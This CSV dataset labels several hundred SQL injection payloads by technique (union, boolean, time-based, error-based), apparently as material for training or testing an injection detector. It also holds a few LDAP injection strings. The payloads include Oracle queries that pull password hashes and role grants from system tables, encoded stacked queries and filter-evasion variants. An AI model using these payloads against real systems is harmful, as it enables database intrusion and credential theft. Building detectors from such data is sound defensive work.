label,payload,family
attack," select * from users where id  =  1 -1<@ union select 1,version  (    )   -- 1",union
attack,"  )   or benchmark  (  10000000,MD5  (  1   )    )   #",time
attack,delete,other
attack,declare @s varchar  (  200  )   select @s   =   0x77616974 ...,other
attack," select * from users where id  =  1 or "";["" or 1  =  1 -- 1",boolean
attack," AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  column_name  )   FROM   (  SELECT DISTINCT  (  column_name  )  , ROWNUM AS LIMIT FROM all_tab_columns  )   WHERE LIMIT  =  2   )    )    AND 'i'  =  'i",error
attack," select * from users where id  =  1 or ""1#"" or 1  =  1 -- 1",boolean
attack," select * from users where id  =  1 or $<\. union select 1,@@VERSION -- 1",union
attack,sleep 50',time
attack," select * from users where id  =  '1' + 1||1 union select 1,banner from v$version where rownum  =  1 -- 1'",union
attack," select * from users where id  =  1 or "";_"" or 1  =  1 -- 1",boolean
attack," select * from users where id  =  1 union select  @ $,version  (    )   -- 1",union
attack,"admin""or 1  =  1 or """"  =  """,boolean
attack,uni/**/on sel/**/ect,union
attack,1 or sleep  (  __TIME__  )  #,time
attack," select * from users where id  =  '1' union select $[""],@@VERSION -- 1'",union
attack," select * from users where id  =  '1' + @  (  1  )   union select 1,version  (    )   -- 1'",union
attack,"1' and 1  =    (  select count  (  *  )   from tablenames  )  , --",boolean
attack,""" or benchmark  (  10000000,MD5  (  1   )    )   #",time
attack,select * from users where id  =  '1'<@.. or 1  =  1 -- 1',boolean
attack,select * from users where id  =  '1' or \<\. or 1  =  1 -- 1',boolean
attack,exec  (  @s  ) ,other
attack,"x' AND email IS NULL, --",boolean
attack," select * from users where id  =  1.*1 union select 1,banner from v$version where rownum  =  1 -- 1",union
attack,update,other
attack," select * from users where id  =  1. <@ union select 1,version  (    )   -- 1",union
attack,or   (  EXISTS  ) ,other
attack," select * from users where id  =  1 or ""  )  ;"" or 1  =  1 -- 1",boolean
attack," select * from users where id  =  1 <@1$ union select 1,version  (    )   -- 1",union
attack, or 0  =  0 --,boolean
attack," select * from users where id  =  1 or 1#"", union select version  (    )  ,version  (    )   -- 1",union
attack," union   (  select NULL,   (  select @@version   )    )    --",other
attack," select * from users where id  =  1 or $<\ union select 1,@@VERSION -- 1",union
attack,UNION SELECT,union
attack," select * from users where id  =  1 or   (  \  )    =  1 union select 1,@@VERSION -- 1",union
attack," select * from users where id  =  1 +  (  1  )   union select 1,banner from v$version where rownum  =  1 -- 1",union
attack," AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  PASSWORD  )   FROM   (  SELECT DISTINCT  (  PASSWORD  )  , ROWNUM AS LIMIT FROM SYS.USER$  )   WHERE LIMIT  =  3   )    )    AND 'i'  =  'i",error
attack," union   (  select NULL, NULL,   (  select @@version   )    )    --",other
attack,"admin""/*",other
attack," union   (  select NULL, NULL, NULL, NULL,  NULL,   (  select @@version   )    )    --",other
attack,"""hi""""  )   or   (  """"a""""  =  """"a""",boolean
attack,declare @q nvarchar   (  200  )   0x730065006c00650063 ...,other
attack," select * from users where id  =  1 or  1<@  =  1 union select 1,version  (    )   -- 1",union
attack," union   (  select NULL, NULL, NULL, NULL,    (  select @@version   )    )    --",other
attack," select * from users where id  =  1 or 1#""  (   union select 'a',version  (    )   -- 1",union
attack," select * from users where id  =  1 or ""1["" or 1  =  1 -- 1",boolean
attack,desc,other
attack," select * from users where id  =  1 or "",  )  ""  =  1 or 1  =  1 -- 1",boolean
attack,0x770061006900740066006F0072002000640065006C00 ...,other
attack,or isNULL  (  1/0  )   /*,boolean
attack," select * from users where id  =  1 or ""$@"" or 1  =  1 -- 1",boolean
attack,"admin"" or 1  =  1--",boolean
attack, or user like '%,boolean
attack," select * from users where id  =  1 or ""  )  $"" or 1  =  1 -- 1",boolean
attack, or ''-',other
attack, ( ,other
attack," select * from users where id  =  1.%@ union select 1,version  (    )   -- 1",union
attack,or pg_sleep  (  __TIME__  )  --,time
attack,0x730065006c0065006300740020004000400076006500 ...,other
attack," select * from users where id  =  1. <@ union select version  (    )  ,version  (    )   -- 1",union
attack,select * from users where id  =  '1' or \<$ or 1  =  1 -- 1',boolean
attack,or 'something'   =   'some'+'thing',boolean
attack," AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  granted_role  )   FROM   (  SELECT DISTINCT  (  granted_role  )  , ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE  =  SYS.LOGINUSER  )   WHERE LIMIT  =  2   )    )    AND 'i'  =  'i",error
attack," select * from users where id  =  1 +1<@ union select version  (    )  ,version  (    )   -- 1",union
attack,%2A%28%7C%28mail%3D%2A%29%29,other
attack," select * from users where id  =  1 or ""  (  _"" or 1  =  1 -- 1",boolean
attack," AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  USERNAME  )   FROM   (  SELECT DISTINCT  (  USERNAME  )  , ROWNUM AS LIMIT FROM SYS.ALL_USERS  )   WHERE LIMIT  =  3   )    )    AND 'i'  =  'i",error
attack,"admin""  )   or ""1""  =  ""1""#",boolean
attack," select * from users where id  =  1 or ""@;""  =  1 or 1  =  1 -- 1",boolean
attack, or username like '%,boolean
attack,declare @s varchar  (  200  )   select @s   =   0x77616974666F722064656C61792027303A303A31302700 exec  (  @s  ) ,other
attack,select * from users where id  =  1 +$ . or 1  =  1 -- 1,boolean
attack," select * from users where id  =  '1' *  (  1  )   union select 1,banner from v$version where rownum  =  1 -- 1'",union
attack," select * from users where id  =  1 +   (  \.  )   union select null,@@VERSION -- 1",union
attack," select * from users where id  =  '1' union select "";""_,version  (    )   -- 1'",union
attack,"""&""",other
attack," select * from users where id  =  1 or "";.""  =  1 or 1  =  1 -- 1",boolean
attack," select * from users where id  =  1 or "";&"" or 1  =  1 -- 1",boolean
attack,select * from users where id  =  '1' or \<1 or 1  =  1 -- 1',boolean
attack, AND 1  =  utl_inaddr.get_host_address   (    (   SELECT COUNT  (  DISTINCT  (  GRANTED_ROLE   )    )    FROM DBA_ROLE_PRIVS WHERE GRANTEE  =  SYS.LOGIN_USER   )    )    AND 'i'  =  'i,error
attack," select * from users where id  =  1 or ""@#"" or 1  =  1 -- 1",boolean
attack,""" or ""a""  =  ""a",boolean
attack," select * from users where id  =  1 or 1#""$ union select 'a',version  (    )   -- 1",union
attack,"benchmark  (  10000000,MD5  (  1   )    )   #",time
attack," select * from users where id  =  1 or ""%;"" or 1  =  1 -- 1",boolean
attack,1' or '1'  =  '1,boolean
attack,",@variable",other
attack,%2A%7C,other
attack,*  (  |  (  mail  =  *   )    ) ,other
attack," select * from users where id  =  1 or 1#"", union select 1,version  (    )   -- 1",union
attack,select * from users where id  =  1 or !<@ or 1  =  1 -- 1,boolean
attack,"<>""'%;  )    (  &+",other
attack,0x730065006c00650063007400200040004000760065007200730069006f006e00 exec  (  @q  ) ,other
attack," select * from users where id  =  '1' or   (  1  )    =  1 union select 1,banner from v$version where rownum  =  1 -- 1'",union
attack,"""a"""" or 3  =  3--""",boolean
attack,admin' --,other
attack,select * from users where id  =  1 +1 or 1  =  1 -- 1,boolean
attack," select * from users where id  =  1 or 1#""; union select version  (    )  ,version  (    )   -- 1",union
attack,"""*""",other
attack,*  (  |  (  objectclass  =  *   )    ) ,other
attack,*|,other
attack," select * from users where id  =  1 or 1#""{ union select 'a',version  (    )   -- 1",union
attack," select * from users where id  =  1 or ""  (  ,""  =  1 or 1  =  1 -- 1",boolean
attack,# from wapiti,other
attack,"1""  )   and   (  5452  =  6050  )  *6050 and   (  ""ciyc"" like ""ciyc",boolean
attack,"-4925"" union all select 5686,5686,5686,5686,5686,5686,5686#",union
attack,-9534%' or 3038  =  3038,boolean
attack,"1' and 8635  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",boolean
attack,"call regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and    (    (   ""pawh""  =  ""pawh",boolean
attack,1   )    )     )   and 3715 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  3715  =  3715  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and    (    (     (  9548  =  9548,boolean
attack,1%' and 4386  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4386  =  4386  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and '%'  =  ',error
attack,"1""  )   and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )    and   (  ""jozh""  =  ""jozh",time
attack,"-9508  )   union all select 9950,9950,9950,9950,9950,9950,9950#",union
attack,"1%'   )    )     )   or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and    (    (     (  '%'  =  '",error
attack,"1"" where 2462  =  2462 and 2716  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",boolean
attack,1'  )   as oknw where 8777  =  8777,other
attack,-5742' where 1314  =  1314 or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )  --,boolean
attack,"1   )    )    as potk where 5040  =  5040 or elt  (  5873  =  5873,sleep  (  5   )    )   #",time
attack,-7535  )   or 2724 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  2724  =  2724  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     ) ,boolean
attack,"-2312'   )    )     )   union all select 5282,5282,5282,5282,5282,5282,5282,5282--",union
attack,"select pg_sleep  (  5  )   and   (  ""%""  =  """,time
attack,"call regexp_substring  (  repeat  (  right  (  char  (  3702  )  ,0  )  ,500000000  )  ,null  )   and    (    (   4142  =  4142",boolean
attack,"-8153'  )   as qhlb where 4948  =  4948 union all select 4948,4948,4948,4948,4948,4948#",union
attack,-9446   )    )    as wmrq where 3705  =  3705 union all select 3705#,union
attack,"iif  (  7889  =  5114,1,1/0  )  ",other
attack,"1%'  )   and elt  (  4249  =  4249,7259  )   and   (  '%'  =  '",boolean
attack,-3859  )   or 3440  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  3440  =  3440  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )   and   (  5846  =  5846,error
attack,-2120'  )   or 8734  =  8844#,boolean
attack,"-4984%""   )    )     )   union all select 6980,6980,6980,6980,6980,6980,6980,6980#",union
attack,"1""   )    )    and elt  (  3114  =  3114,sleep  (  5   )    )   #",time
attack,1  )   and 3754  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  3754  =  3754  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  ) ,error
attack,"1   )    )     )   or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and    (    (     (  8814  =  8814",boolean
attack,"select like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (   'nimx'  =  'nimx",boolean
attack,select   (  case when   (  2161  =  4328  )   then 2161 else 2161*  (  select 2161 from mysql.db  )   end  )  #,other
attack,"-9854  )   or 5023  =  ctxsys.drithsx.sn  (  5023,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  5023  =  5023  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and   (  5696  =  5696",error
attack,"1' union all select null,null,null,null--",union
attack,"-4670""   )    )    or 3038  =  3038",boolean
attack,"select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3-- ampw",other
attack,-3921'  )   as audo where 7087  =  7087 or 1755  =  4937--,boolean
attack,"-2072""  )   as rjcz where 2491  =  2491 or 6872  =  6872--",boolean
attack,select   (  case when   (  3855  =  3855  )   then 3855 else 1/  (  select 0  )   end  )  --,other
attack,"select like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and   (  'dthp'  =  'dthp",boolean
attack,1'||  (  select 'uiyj' from dual where 8320  =  8320,other
attack,"1 where 1096  =  1096 and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )   --",error
attack,1' where 7191  =  7191 rlike sleep  (  5  )  --,time
attack,"1' and   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  3484  =  3484,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )   and 'wjwn'  =  'wjwn",boolean
attack,"1""  )   where 1330  =  1330 or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  )  --",time
attack,"1 union all select null,null#",union
attack,"1'||  (  select 'wyng' from dual where 2157  =  2157 union all select null,null--",union
attack,"1%""   )    )    and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and    (    (   ""%""  =  """,error
attack,"1%""   )    )     )   or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",time
attack,"1%""   )    )     )   and 7533  =  7533 and    (    (     (  ""%""  =  """,boolean
attack,"1""   )    )     )   or elt  (  5873  =  5873,sleep  (  5   )    )   #",time
attack,"-3829%""  )   union all select 2218,2218,2218,2218,2218,2218,2218--",union
attack,"-8629 where 8049  =  8049 union all select 8049,8049,8049,8049,8049,8049,8049#",union
attack,"1""   )    )    as osuh where 8809  =  8809",other
attack,"1""   )    )     )   or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and    (    (     (  ""hkjm"" like ""hkjm",error
attack,1  )   as lisg where 5490  =  5490,other
attack,"-9656"" union all select 8735,8735--",union
attack,"1%""   )    )    and 8635  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",boolean
attack,-9840'   )    )    or 4747  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4747  =  4747  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and    (    (   'dzlp'  =  'dzlp,boolean
attack,-6233'  )   where 9820  =  9820 or 3038  =  3038,boolean
attack,"-3234%""   )    )    or elt  (  1032  =  1032,3623  )   and    (    (   ""%""  =  """,boolean
attack,"-7482%""   )    )    or 1570  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  1570  =  1570  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and    (    (   ""%""  =  """,boolean
attack,"-9135""   )    )    or 6872  =  6872 and    (    (   ""fllx""  =  ""fllx",boolean
attack,-7111' or   (  8459  =  8459  )  *4906,boolean
attack,1' and 4386  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4386  =  4386  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and 'iuao'  =  'iuao,error
attack,"1""   )    )    as bbkl where 5686  =  5686",other
attack,"1%""   )    )    and elt  (  4249  =  4249,7259  )   and    (    (   ""%""  =  """,boolean
attack,"-6333""   )    )     )   union all select 9851,9851,9851,9851,9851,9851--",union
attack,"1""   )    )    and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and    (    (   ""xccy""  =  ""xccy",error
attack,"-1808%""   )    )    or 4595  =  3545 and    (    (   ""%""  =  """,boolean
attack,"1%"" union all select null,null,null,null,null#",union
attack,1'   )    )    as pgif where 6346  =  6346,other
attack,"1'  )   and   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  3484  =  3484,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )  ",boolean
attack,"1'  )   as knxr where 5662  =  5662 union all select null,null,null,null,null,null,null,null#",union
attack,"1%"" or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and ""%""  =  """,boolean
attack,"-3475"" or elt  (  5532  =  4242,4242  )  ",boolean
attack,select   (  case when   (  2774  =  5503  )   then 2774 else 2774*  (  select 2774 from information_schema.character_sets  )   end  )  #,other
attack,"1   )    )    as ambt where 5198  =  5198 and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )  --",boolean
attack,"-3513%"" union all select 8473,8473#",union
attack,"-9286""   )    )    as mfxl where 9348  =  9348 union all select 9348#",union
attack,1'  )   and 7756  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  7756  =  7756  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and   (  'lnte'  =  'lnte,boolean
attack,"1"" and 2853  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  2853  =  2853  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )  ",error
attack,"1""  )   where 2834  =  2834   (  select   (  case when   (  5451  =  5451  )   then regexp_substring  (  repeat  (  right  (  char  (  5451  )  ,0  )  ,500000000  )  ,null  )   else char  (  108  )  ||char  (  76  )  ||char  (  112  )  ||char  (  116  )   end  )   from information_schema.system_users  )  --",other
attack,"-1963 union all select 6831,6831,6831,6831,6831,6831,6831,6831#",union
attack,"1"" or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  )   and ""pxix""  =  ""pxix",time
attack,select case when 6420  =  7941 then 1 else null end--,other
attack,"select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and    (    (     (  5432  =  5432",boolean
attack,"1'   )    )    or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and    (    (   'qgov'  =  'qgov",boolean
attack,"1,exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  7759  =  7759,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   ",error
attack,"1'   )    )     )   and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and    (    (     (  'dhqz'  =  'dhqz",boolean
attack,"-8491"" where 6107  =  6107 or 4493  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4493  =  4493  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )   --",error
attack,"1',  (  select   (  case when   (  6894  =  6087  )   then 1 else 6894*  (  select 6894 from information_schema.character_sets  )   end   )    )   ",other
attack,"select dbms_pipe.receive_message  (  chr  (  66  )  ||chr  (  67  )  ||chr  (  79  )  ||chr  (  101  )  ,5  )   from dual--",other
attack,"1""   )    )    and 2853  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  2853  =  2853  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )   and    (    (   ""mxnj"" like ""mxnj",error
attack,"1""   )    )     )   and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and    (    (     (  ""xnsj"" like ""xnsj",boolean
attack,"call regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and    (    (   'tpih'  =  'tpih",boolean
attack,-7199'||  (  select 'ssty' where 5406  =  5406 order by 1#,other
attack,"1"" where 7045  =  7045",other
attack,"-3501""   )    )     )   or   (  6789  =  6990  )  *6990 and    (    (     (  ""jnnc"" like ""jnnc",boolean
attack,"1%'   )    )    or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and    (    (   '%'  =  '",error
attack,"1   )    )    as nxdf where 1696  =  1696 or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",time
attack,select case when 6229  =  2077 then 1 else null end--,other
attack,"1""   )    )     )   and 7756  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  7756  =  7756  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and    (    (     (  ""kcxw""  =  ""kcxw",boolean
attack,"1  )   or 5286  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  ",boolean
attack,"select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3-- uugg",other
attack,-2573   )    )    order by 1#,other
attack,"1'+  (  select 'vwzp' where 2729  =  2729 or 7427  =  dbms_pipe.receive_message  (  chr  (  116  )  ||chr  (  87  )  ||chr  (  90  )  ||chr  (  109  )  ,5  )  --",boolean
attack,"1 or 5286  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  # msrb",boolean
attack,1'  )   as bihs where 4197  =  4197,other
attack,"1   )    )     )   union all select null,null,null,null,null,null--",union
